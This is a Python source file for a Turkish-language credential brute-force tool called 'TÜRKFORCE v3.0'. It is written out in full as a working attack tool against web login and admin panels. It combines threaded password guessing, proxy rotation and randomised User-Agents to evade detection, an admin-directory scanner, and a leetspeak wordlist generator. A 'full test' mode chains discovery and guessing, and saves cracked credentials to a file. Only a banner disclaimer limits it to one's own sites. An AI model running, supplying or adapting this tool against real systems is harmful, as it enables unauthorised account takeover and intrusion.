#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                      TÜRKFORCE v3.0 - ULTIMATE                              ║
║              Professional Brute Force Testing Tool                          ║
║                                                                              ║
║  ⚠️ SADECE KENDİ TEST SİTENİZDE KULLANIN!                                   ║
║  ⚠️ Yetkisiz kullanım YASA DIŞIDIR! (TCK 243-245)                          ║
║  ╚══════════════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import time
import json
import random
import hashlib
import requests
import threading
from queue import Queue
from datetime import datetime
from urllib.parse import urlparse, urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except:
    os.system(f"{sys.executable} -m pip install colorama")
    from colorama import Fore, Style, init
    init(autoreset=True)

# ==================== RENKLER ====================
R = Fore.RED
G = Fore.GREEN
Y = Fore.YELLOW
B = Fore.BLUE
C = Fore.CYAN
M = Fore.MAGENTA
W = Fore.WHITE
RESET = Style.RESET_ALL

# ==================== YAPILANDIRMA ====================
CONFIG = {
    "timeout": 5,
    "max_retries": 3,
    "retry_delay": 1,
    "save_session": True,
    "log_file": "turkforce_log.txt",
    "results_file": "bulunan_sifreler.json",
    "resume_file": "resume_state.json"
}

# ==================== TÜRKFORCE ANA SINIF ====================
class TürkForce:
    def __init__(self, target_url, username_field, password_field, method="POST"):
        self.target_url = target_url
        self.username_field = username_field
        self.password_field = password_field
        self.method = method.upper()
        self.session = requests.Session()
        self.results = []
        self.found_credentials = None
        self.request_count = 0
        self.success_count = 0
        self.fail_count = 0
        self.start_time = None
        self.stop_flag = False
        self.current_test = None
        self.proxies = []
        self.current_proxy_index = 0
        
        # User-Agent havuzu
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15'
        ]
        
        # Sonuç göstergeleri
        self.success_indicators = [
            'dashboard', 'panel', 'admin', 'welcome', 'hoşgeldin',
            'success', 'başarılı', 'redirect', 'location:', 'profile'
        ]
        
        self.fail_indicators = [
            'hatalı', 'invalid', 'wrong', 'error', 'hata', 'failed',
            'incorrect', 'geçersiz', 'yanlış'
        ]
        
        # Log dosyasını oluştur
        self._init_log()
    
    def _init_log(self):
        """Log dosyasını başlat"""
        with open(CONFIG["log_file"], "a", encoding="utf-8") as f:
            f.write(f"\n{'='*60}\n")
            f.write(f"TÜRKFORCE v3.0 - OTURUM BAŞLADI: {datetime.now()}\n")
            f.write(f"Hedef: {self.target_url}\n")
            f.write(f"{'='*60}\n")
    
    def log(self, message, level="INFO"):
        """Log kaydı"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] [{level}] {message}\n"
        
        with open(CONFIG["log_file"], "a", encoding="utf-8") as f:
            f.write(log_entry)
        
        if level == "SUCCESS":
            print(f"{G}{message}{RESET}")
        elif level == "ERROR":
            print(f"{R}{message}{RESET}")
        elif level == "WARNING":
            print(f"{Y}{message}{RESET}")
        else:
            print(f"{C}{message}{RESET}")
    
    def load_wordlist(self, username_file=None, password_file=None):
        """Wordlist dosyalarını yükle"""
        usernames = []
        passwords = []
        
        # Varsayılan wordlist'ler (eğer dosya yoksa)
        default_usernames = ['admin', 'root', 'test', 'user', 'administrator']
        default_passwords = ['123456', 'password', 'admin', '123456789', 'qwerty']
        
        # Kullanıcı adlarını yükle
        if username_file and os.path.exists(username_file):
            try:
                with open(username_file, 'r', encoding='utf-8') as f:
                    usernames = [line.strip() for line in f if line.strip()]
                self.log(f"{len(usernames)} kullanıcı adı yüklendi: {username_file}", "INFO")
            except Exception as e:
                self.log(f"Kullanıcı dosyası okunamadı: {e}", "ERROR")
                usernames = default_usernames
        else:
            usernames = default_usernames
            self.log(f"Varsayılan kullanıcı listesi kullanılıyor ({len(usernames)} adet)", "WARNING")
        
        # Şifreleri yükle
        if password_file and os.path.exists(password_file):
            try:
                with open(password_file, 'r', encoding='utf-8', errors='ignore') as f:
                    passwords = [line.strip() for line in f if line.strip()]
                self.log(f"{len(passwords)} şifre yüklendi: {password_file}", "INFO")
            except Exception as e:
                self.log(f"Şifre dosyası okunamadı: {e}", "ERROR")
                passwords = default_passwords
        else:
            passwords = default_passwords
            self.log(f"Varsayılan şifre listesi kullanılıyor ({len(passwords)} adet)", "WARNING")
        
        return usernames, passwords
    
    def load_proxies(self, proxy_file=None):
        """Proxy listesi yükle"""
        if proxy_file and os.path.exists(proxy_file):
            try:
                with open(proxy_file, 'r') as f:
                    self.proxies = [line.strip() for line in f if line.strip()]
                self.log(f"{len(self.proxies)} proxy yüklendi", "INFO")
            except:
                self.log("Proxy dosyası okunamadı", "WARNING")
    
    def get_proxy(self):
        """Sıradaki proxy'yi al"""
        if not self.proxies:
            return None
        proxy = self.proxies[self.current_proxy_index]
        self.current_proxy_index = (self.current_proxy_index + 1) % len(self.proxies)
        return {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
    
    def _random_headers(self):
        """Rastgele header oluştur"""
        return {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'tr-TR,tr;q=0.9,en;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Referer': self.target_url,
            'DNT': '1',
            'Upgrade-Insecure-Requests': '1'
        }
    
    def _make_request(self, username, password, retry_count=0):
        """HTTP isteği yap (retry mekanizmalı)"""
        self.request_count += 1
        self.current_test = f"{username}:{password}"
        
        # Proxy seç
        proxies = self.get_proxy()
        
        try:
            if self.method == "POST":
                data = {
                    self.username_field: username,
                    self.password_field: password
                }
                response = self.session.post(
                    self.target_url,
                    data=data,
                    headers=self._random_headers(),
                    proxies=proxies,
                    timeout=CONFIG["timeout"],
                    allow_redirects=True
                )
                return response
            
            elif self.method == "GET":
                params = {
                    self.username_field: username,
                    self.password_field: password
                }
                response = self.session.get(
                    self.target_url,
                    params=params,
                    headers=self._random_headers(),
                    proxies=proxies,
                    timeout=CONFIG["timeout"]
                )
                return response
            
        except requests.exceptions.Timeout:
            if retry_count < CONFIG["max_retries"]:
                time.sleep(CONFIG["retry_delay"])
                return self._make_request(username, password, retry_count + 1)
            self.fail_count += 1
            return None
        except Exception as e:
            if retry_count < CONFIG["max_retries"]:
                time.sleep(CONFIG["retry_delay"])
                return self._make_request(username, password, retry_count + 1)
            self.fail_count += 1
            return None
        
        return None
    
    def _is_success(self, response):
        """Başarılı giriş kontrolü (gelişmiş)"""
        if not response:
            return False
        
        # URL değişimi kontrolü (redirect)
        if response.url != self.target_url:
            return True
        
        # Status code kontrolü
        if response.status_code in [200, 302, 303]:
            response_text = response.text.lower()
            
            # Başarısız giriş kontrolü
            for indicator in self.fail_indicators:
                if indicator in response_text:
                    return False
            
            # Başarılı giriş kontrolü
            for indicator in self.success_indicators:
                if indicator in response_text:
                    self.success_count += 1
                    return True
        
        return False
    
    def brute_single(self, username, password):
        """Tek deneme"""
        response = self._make_request(username, password)
        if self._is_success(response):
            result = {
                "username": username,
                "password": password,
                "timestamp": str(datetime.now()),
                "response_url": response.url if response else None,
                "status_code": response.status_code if response else None
            }
            return result
        return None
    
    def save_result(self, result):
        """Sonucu kaydet"""
        self.results.append(result)
        
        # JSON dosyasına kaydet
        try:
            with open(CONFIG["results_file"], "r", encoding="utf-8") as f:
                existing = json.load(f)
        except:
            existing = []
        
        existing.append(result)
        
        with open(CONFIG["results_file"], "w", encoding="utf-8") as f:
            json.dump(existing, f, indent=2, ensure_ascii=False)
    
    def save_resume_state(self, tested_combinations, total, usernames, passwords):
        """Kaldığı yerden devam için durum kaydet"""
        state = {
            "target_url": self.target_url,
            "tested_count": tested_combinations,
            "total_count": total,
            "usernames": usernames,
            "passwords": passwords,
            "timestamp": str(datetime.now())
        }
        with open(CONFIG["resume_file"], "w", encoding="utf-8") as f:
            json.dump(state, f, indent=2)
    
    def load_resume_state(self):
        """Kaydedilmiş durumu yükle"""
        try:
            with open(CONFIG["resume_file"], "r", encoding="utf-8") as f:
                return json.load(f)
        except:
            return None
    
    def _progress(self, current, total):
        """Gelişmiş ilerleme göstergesi"""
        percent = (current / total) * 100
        bar_length = 40
        filled = int(bar_length * current // total)
        bar = f"{G}█{RESET}" * filled + f"{R}░{RESET}" * (bar_length - filled)
        
        elapsed = (datetime.now() - self.start_time).total_seconds() if self.start_time else 0
        speed = current / elapsed if elapsed > 0 else 0
        eta = (total - current) / speed if speed > 0 else 0
        
        sys.stdout.write(f"\r{C}[{bar}] {Y}{percent:.1f}%{RESET} | {W}{current}/{total}{RESET} | {G}{speed:.1f} req/s{RESET} | Kalan: {Y}{eta:.0f}s{RESET}    ")
        sys.stdout.flush()
    
    def _print_header(self, total_combinations, threads, delay):
        """Başlangıç başlığını göster"""
        self.log(f"\n{G}╔═══════════════════════════════════════════════════════════════╗{RESET}", "INFO")
        self.log(f"{G}║{C} TÜRKFORCE v3.0 - Brute Force Başlatıldı                      {G}║{RESET}", "INFO")
        self.log(f"{G}╠═══════════════════════════════════════════════════════════════╣{RESET}", "INFO")
        self.log(f"{G}║{Y}   Hedef: {W}{self.target_url}{Y}                                      {G}║{RESET}", "INFO")
        self.log(f"{G}║{Y}   Kombinasyon: {W}{total_combinations:,}{Y}                              {G}║{RESET}", "INFO")
        self.log(f"{G}║{Y}   Thread: {W}{threads}{Y} | Gecikme: {W}{delay}ms{Y}                    {G}║{RESET}", "INFO")
        self.log(f"{G}║{Y}   Proxy: {W}{len(self.proxies)}{Y} adet{' aktif' if self.proxies else ' (yok)'}{Y}                    {G}║{RESET}", "INFO")
        self.log(f"{G}╚═══════════════════════════════════════════════════════════════╝{RESET}", "INFO")
        print()
    
    def _print_found(self, result):
        """Bulunan bilgileri göster"""
        self.log(f"\n{G}╔═══════════════════════════════════════════════════════════════╗{RESET}", "SUCCESS")
        self.log(f"{G}║{G} 🎉 ŞİFRE BULUNDU! 🎉                                          {G}║{RESET}", "SUCCESS")
        self.log(f"{G}╠═══════════════════════════════════════════════════════════════╣{RESET}", "SUCCESS")
        self.log(f"{G}║{W}   Kullanıcı: {G}{result['username']}{W}                                      {G}║{RESET}", "SUCCESS")
        self.log(f"{G}║{W}   Şifre: {G}{result['password']}{W}                                         {G}║{RESET}", "SUCCESS")
        self.log(f"{G}║{W}   HTTP Kodu: {G}{result['status_code']}{W}                              {G}║{RESET}", "SUCCESS")
        self.log(f"{G}║{W}   Zaman: {G}{result['timestamp']}{W}                              {G}║{RESET}", "SUCCESS")
        self.log(f"{G}╚═══════════════════════════════════════════════════════════════╝{RESET}", "SUCCESS")
    
    def _print_summary(self):
        """Özet rapor"""
        elapsed = (datetime.now() - self.start_time).total_seconds()
        success_rate = (self.success_count / self.request_count * 100) if self.request_count > 0 else 0
        
        self.log(f"\n{Y}╔═══════════════════════════════════════════════════════════════╗{RESET}", "INFO")
        self.log(f"{Y}║{W} BRUTE FORCE RAPORU                                            {Y}║{RESET}", "INFO")
        self.log(f"{Y}╠═══════════════════════════════════════════════════════════════╣{RESET}", "INFO")
        self.log(f"{Y}║{W}   Toplam İstek: {C}{self.request_count:,}{W}                                   {Y}║{RESET}", "INFO")
        self.log(f"{Y}║{W}   Başarılı: {G}{self.success_count}{W} | Başarısız: {R}{self.fail_count}{W}                       {Y}║{RESET}", "INFO")
        self.log(f"{Y}║{W}   Süre: {C}{elapsed:.2f}{W} saniye                                    {Y}║{RESET}", "INFO")
        self.log(f"{Y}║{W}   Hız: {C}{self.request_count/elapsed:.1f}{W} istek/saniye                        {Y}║{RESET}", "INFO")
        self.log(f"{Y}║{W}   Başarı Oranı: {C}{success_rate:.1f}%{W}                                   {Y}║{RESET}", "INFO")
        self.log(f"{Y}║{W}   Sonuç: {G}BULUNDU{RESET} if self.found_credentials else {R}BULUNAMADI{RESET}{Y}                    {G}║{RESET}", "INFO" if not self.found_credentials else "SUCCESS")
        self.log(f"{Y}╚═══════════════════════════════════════════════════════════════╝{RESET}", "INFO")
    
    def brute_force(self, usernames, passwords, threads=10, delay=0, resume=False):
        """Ana brute force fonksiyonu"""
        self.start_time = datetime.now()
        self.stop_flag = False
        
        total_combinations = len(usernames) * len(passwords)
        tested = 0
        self._print_header(total_combinations, threads, delay)
        
        # Resume desteği
        start_username_idx = 0
        start_password_idx = 0
        
        if resume:
            state = self.load_resume_state()
            if state and state['target_url'] == self.target_url:
                tested = state['tested_count']
                self.log(f"Kaldığı yerden devam ediliyor: {tested}/{total_combinations}", "INFO")
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            
            for u_idx, username in enumerate(usernames):
                if self.stop_flag:
                    break
                
                for p_idx, password in enumerate(passwords):
                    if self.stop_flag:
                        break
                    
                    # Resume kontrolü
                    if resume and tested > 0:
                        if u_idx < start_username_idx or (u_idx == start_username_idx and p_idx < start_password_idx):
                            tested += 1
                            continue
                    
                    future = executor.submit(self.brute_single, username, password)
                    futures.append((future, username, password))
                    
                    if delay > 0:
                        time.sleep(delay / 1000)
                    
                    tested += 1
                    self._progress(tested, total_combinations)
                    
                    # Her 1000 denemede bir durum kaydet
                    if tested % 1000 == 0:
                        self.save_resume_state(tested, total_combinations, usernames, passwords)
            
            # Sonuçları kontrol et
            for future, username, password in futures:
                result = future.result()
                if result and not self.found_credentials:
                    self.found_credentials = result
                    self.save_result(result)
                    self._print_found(result)
                    self.stop_flag = True
                    break
        
        self._print_summary()
        self.log(f"Oturum sonlandı: {datetime.now()}", "INFO")
        
        return self.found_credentials
    
    def stop(self):
        """Saldırıyı durdur"""
        self.stop_flag = True
        self.log("Saldırı kullanıcı tarafından durduruldu", "WARNING")

# ==================== DİZİN TARAYICI ====================
class DirectoryScanner:
    """Hızlı dizin tarayıcı"""
    
    COMMON_DIRS = [
        'admin', 'login', 'wp-admin', 'administrator', 'panel', 'dashboard',
        'cpanel', 'webadmin', 'admincp', 'adminer', 'backend', 'management',
        'yönetim', 'yonetim', 'adminpanel', 'sysadmin', 'control'
    ]
    
    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.found = []
    
    def scan(self, wordlist=None, threads=30):
        print(f"\n{B}[*] Dizin taraması başlatılıyor: {self.base_url}{RESET}")
        
        dirs = wordlist or self.COMMON_DIRS
        found_lock = threading.Lock()
        
        def check_dir(directory):
            url = f"{self.base_url}/{directory}"
            try:
                response = requests.get(url, timeout=3, headers={'User-Agent': 'Mozilla/5.0'})
                if response.status_code == 200:
                    with found_lock:
                        self.found.append(url)
                        print(f"{G}[+] Bulundu: {url}{RESET}")
                elif response.status_code == 403:
                    print(f"{Y}[!] Yasak: {url}{RESET}")
            except:
                pass
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            executor.map(check_dir, dirs)
        
        return self.found

# ==================== WORDLIST OLUŞTURUCU ====================
class WordlistGenerator:
    """Wordlist oluşturucu ve birleştirici"""
    
    @staticmethod
    def merge_wordlists(files, output_file):
        """Birden fazla wordlist'i birleştir"""
        all_words = set()
        for file in files:
            try:
                with open(file, 'r', encoding='utf-8', errors='ignore') as f:
                    words = [line.strip() for line in f if line.strip()]
                    all_words.update(words)
                print(f"{G}[+] {len(words)} kelime eklendi: {file}{RESET}")
            except Exception as e:
                print(f"{R}[-] Hata: {file} - {e}{RESET}")
        
        with open(output_file, 'w', encoding='utf-8') as f:
            for word in sorted(all_words):
                f.write(word + '\n')
        
        print(f"{G}[+] {len(all_words)} kelime kaydedildi: {output_file}{RESET}")
        return output_file
    
    @staticmethod
    def generate_smart_wordlist(base_word):
        """Akıllı wordlist oluştur (leetspeak, büyük/küçük harf vb.)"""
        variations = set()
        base = base_word.lower()
        
        variations.add(base)
        variations.add(base.capitalize())
        variations.add(base.upper())
        
        # Leetspeak dönüşümleri
        leet_map = {
            'a': ['4', '@'], 'e': ['3'], 'i': ['1', '!'],
            'o': ['0'], 's': ['5', '$'], 't': ['7']
        }
        
        def leet(word, pos=0):
            if pos >= len(word):
                variations.add(word)
                return
            leet(word, pos+1)
            char = word[pos]
            if char in leet_map:
                for replacement in leet_map[char]:
                    leet(word[:pos] + replacement + word[pos+1:], pos+1)
        
        leet(base)
        return list(variations)

# ==================== ANA MENÜ ====================
def banner():
    return f"""
{R}╔══════════════════════════════════════════════════════════════════════════╗
{R}║{C}                      T Ü R K F O R C E   v3.0                              {R}║
{R}║{Y}              ULTIMATE BRUTE FORCE TESTING TOOL                            {R}║
{R}╚══════════════════════════════════════════════════════════════════════════╝{RESET}
    """

def main_menu():
    print(banner())
    print(f"""
{G}[1]{C} 🚀 Admin Paneli Brute Force (Hızlı Mod)
{G}[2]{C} 🔍 Dizin / Yol Tarayıcı
{G}[3]{C} 📝 Wordlist İşlemleri (Birleştir/Oluştur)
{G}[4]{C} ⚡ Full Test (Tüm Özellikler)
{G}[5]{C} 🔄 Kaldığı Yerden Devam Et
{G}[0]{R} ❌ Çıkış{RESET}
    """)

def brute_force_menu():
    print(f"""
{B}╔═══════════════════════════════════════════════════════════════╗
{B}║{C} BRUTE FORCE AYARLARI                                         {B}║
{B}╚═══════════════════════════════════════════════════════════════╝{RESET}
    """)
    
    url = input(f"{B}[?] Admin panel URL: {RESET}")
    username_field = input(f"{B}[?] Username alan adı (örn: username): {RESET}")
    password_field = input(f"{B}[?] Password alan adı (örn: password): {RESET}")
    method = input(f"{B}[?] Method (POST/GET) [POST]: {RESET}") or "POST"
    
    print(f"\n{Y}[*] Wordlist kaynağı:{RESET}")
    print(f"{G}[1]{C} Varsayılan wordlist{RESET}")
    print(f"{G}[2]{C} Kendi wordlist dosyalarım{RESET}")
    source = input(f"{B}[?] Seçim: {RESET}")
    
    username_file = None
    password_file = None
    
    if source == "2":
        username_file = input(f"{B}[?] Kullanıcı adı dosyası (örn: usernames.txt): {RESET}")
        password_file = input(f"{B}[?] Şifre dosyası (örn: passwords.txt): {RESET}")
    
    threads = int(input(f"{B}[?] Thread sayısı [20]: {RESET}") or 20)
    delay = int(input(f"{B}[?] Gecikme (ms) [0]: {RESET}") or 0)
    
    proxy_file = input(f"{B}[?] Proxy dosyası (opsiyonel): {RESET}") or None
    
    return {
        "url": url,
        "username_field": username_field,
        "password_field": password_field,
        "method": method,
        "username_file": username_file,
        "password_file": password_file,
        "threads": threads,
        "delay": delay,
        "proxy_file": proxy_file
    }

def main():
    while True:
        main_menu()
        choice = input(f"\n{B}[?] Seçiminiz: {RESET}")
        
        if choice == "1":
            config = brute_force_menu()
            
            tf = TürkForce(
                config["url"],
                config["username_field"],
                config["password_field"],
                config["method"]
            )
            
            # Proxy yükle
            if config["proxy_file"]:
                tf.load_proxies(config["proxy_file"])
            
            # Wordlist yükle
            usernames, passwords = tf.load_wordlist(
                config["username_file"],
                config["password_file"]
            )
            
            print(f"\n{Y}[*] Başlatılıyor...{RESET}")
            result = tf.brute_force(
                usernames,
                passwords,
                threads=config["threads"],
                delay=config["delay"]
            )
            
            if result:
                print(f"\n{G}[+] BAŞARILI! {result['username']}:{result['password']}{RESET}")
            else:
                print(f"\n{R}[-] Şifre bulunamadı!{RESET}")
            
            input(f"\n{Y}[Enter] devam...{RESET}")
        
        elif choice == "2":
            url = input(f"{B}[?] Hedef URL: {RESET}")
            scanner = DirectoryScanner(url)
            found = scanner.scan()
            
            print(f"\n{G}[+] {len(found)} dizin bulundu:{RESET}")
            for d in found:
                print(f"    {C}{d}{RESET}")
            input(f"\n{Y}[Enter] devam...{RESET}")
        
        elif choice == "3":
            print(f"""
{B}╔═══════════════════════════════════════════════════════════════╗
{B}║{C} WORDLIST İŞLEMLERİ                                           {B}║
{B}╚═══════════════════════════════════════════════════════════════╝{RESET}
            """)
            print(f"{G}[1]{C} Wordlist birleştir{RESET}")
            print(f"{G}[2]{C} Akıllı wordlist oluştur{RESET}")
            sub = input(f"{B}[?] Seçim: {RESET}")
            
            if sub == "1":
                files = input(f"{B}[?] Dosyalar (virgülle ayır, örn: pass1.txt,pass2.txt): {RESET}")
                file_list = [f.strip() for f in files.split(',')]
                output = input(f"{B}[?] Çıktı dosyası: {RESET}")
                WordlistGenerator.merge_wordlists(file_list, output)
            
            elif sub == "2":
                base = input(f"{B}[?] Temel kelime: {RESET}")
                words = WordlistGenerator.generate_smart_wordlist(base)
                output = input(f"{B}[?] Çıktı dosyası: {RESET}")
                with open(output, 'w') as f:
                    for w in words:
                        f.write(w + '\n')
                print(f"{G}[+] {len(words)} kelime oluşturuldu: {output}{RESET}")
            
            input(f"\n{Y}[Enter] devam...{RESET}")
        
        elif choice == "4":
            print(f"\n{Y}[*] FULL TEST BAŞLATILIYOR...{RESET}")
            url = input(f"{B}[?] Hedef URL: {RESET}")
            
            # Dizin tarama
            print(f"\n{C}[1/3] Dizin taraması...{RESET}")
            scanner = DirectoryScanner(url)
            dirs = scanner.scan()
            
            admin_panels = [d for d in dirs if any(x in d.lower() for x in ['admin', 'login', 'panel'])]
            
            if admin_panels:
                panel_url = admin_panels[0]
                print(f"{G}[+] Admin panel bulundu: {panel_url}{RESET}")
                
                print(f"\n{C}[2/3] Brute force başlatılıyor...{RESET}")
                tf = TürkForce(panel_url, 'username', 'password', 'POST')
                usernames = ['admin', 'root', 'test', 'administrator']
                passwords = ['123456', 'password', 'admin', '123456789', 'admin123']
                
                result = tf.brute_force(usernames, passwords, threads=10)
                
                if result:
                    print(f"{G}[+] Şifre bulundu: {result['username']}:{result['password']}{RESET}")
                else:
                    print(f"{R}[-] Şifre bulunamadı{RESET}")
            else:
                print(f"{Y}[!] Admin panel bulunamadı{RESET}")
            
            input(f"\n{Y}[Enter] devam...{RESET}")
        
        elif choice == "5":
            print(f"{Y}[*] Kaldığı yerden devam ediliyor...{RESET}")
            tf = TürkForce("", "", "")  # Geçici
            state = tf.load_resume_state()
            
            if state:
                print(f"{G}[+] Son oturum bulundu: {state['timestamp']}{RESET}")
                print(f"{G}    Hedef: {state['target_url']}{RESET}")
                print(f"{G}    Kalan: {state['total_count'] - state['tested_count']}/{state['total_count']}{RESET}")
                
                devam = input(f"{B}[?] Devam et? (e/h): {RESET}")
                if devam.lower() == 'e':
                    new_tf = TürkForce(
                        state['target_url'],
                        'username',
                        'password',
                        'POST'
                    )
                    new_tf.brute_force(
                        state['usernames'],
                        state['passwords'],
                        resume=True
                    )
            else:
                print(f"{R}[-] Kaydedilmiş oturum bulunamadı{RESET}")
            
            input(f"\n{Y}[Enter] devam...{RESET}")
        
        elif choice == "0":
            print(f"{R}[-] Çıkılıyor...{RESET}")
            sys.exit(0)
        
        else:
            print(f"{R}[-] Geçersiz seçim!{RESET}")
            time.sleep(1)

if __name__ == "__main__":
    print(f"""
{R}╔══════════════════════════════════════════════════════════════════════════╗
{R}║{Y}  UYARI: Bu araç SADECE kendi test sitenizde kullanım içindir!          {R}║
{R}║{Y}  Yetkisiz sistemlere karşı kullanmak YASA DIŞIDIR! (TCK 243-245)      {R}║
{R}║{Y}  Tüm yasal sorumluluk KULLANICIYA AİTTİR!                               {R}║
{R}╚══════════════════════════════════════════════════════════════════════════╝{RESET}
    """)
    main()
